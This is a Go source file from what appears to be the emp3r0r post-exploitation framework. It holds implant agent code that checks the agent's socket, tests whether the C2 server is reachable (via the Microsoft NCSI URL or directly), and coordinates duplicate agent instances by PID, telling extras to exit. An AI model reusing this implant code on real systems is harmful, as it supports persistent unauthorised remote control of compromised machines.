package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"strconv"

	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func isAgentAlive() bool {
	conn, err := net.Dial("unix", agent.RuntimeConfig.SocketName)
	if err != nil {
		log.Printf("Agent seems dead: %v", err)
		return false
	}
	return agent.IsAgentAlive(conn)
}

func isC2Reachable() bool {
	if !agent.RuntimeConfig.DisableNCSI {
		return tun.HasInternetAccess(tun.MicrosoftNCSIURL)
	}

	log.Println("NCSI is disabled, trying direct C2 connection")
	return tun.HasInternetAccess(emp3r0r_data.CCAddress)
}

// handle connections to our socket: tell them my PID
func socket_server(c net.Conn) {
	// how many agents are waiting to run
	var agent_wait_queue []int
	for {
		buf := make([]byte, 512)
		nr, err := c.Read(buf)
		if err != nil {
			return
		}

		pid_data := buf[0:nr]
		pid, err := strconv.ParseInt(string(pid_data), 10, 32)
		if err != nil {
			log.Printf("Invalid PID from ping: %v", err)
			continue
		}
		log.Printf("emp3r0r instance got ping from PID: %d", pid)
		agent_wait_queue = append(agent_wait_queue, int(pid))
		agent_wait_queue = util.RemoveDupsFromArray(agent_wait_queue)
		reply := fmt.Sprintf("emp3r0r running on PID %d", os.Getpid())
		log.Printf("We have %d agents in wait queue", len(agent_wait_queue))
		if len(agent_wait_queue) > 3 {
			log.Println("Too many agents waiting, will start to kill...")
			reply = "emp3r0r wants you to kill yourself"

			// check if agent is still alive, if not, remove it from wait queue
			util.TakeABlink()
			if !util.IsPIDAlive(int(pid)) {
				util.RemoveItemFromArray(int(pid), agent_wait_queue)
			}
		}

		_, err = c.Write([]byte(reply))
		if err != nil {
			log.Printf("Write: %v", err)
		}
	}
}
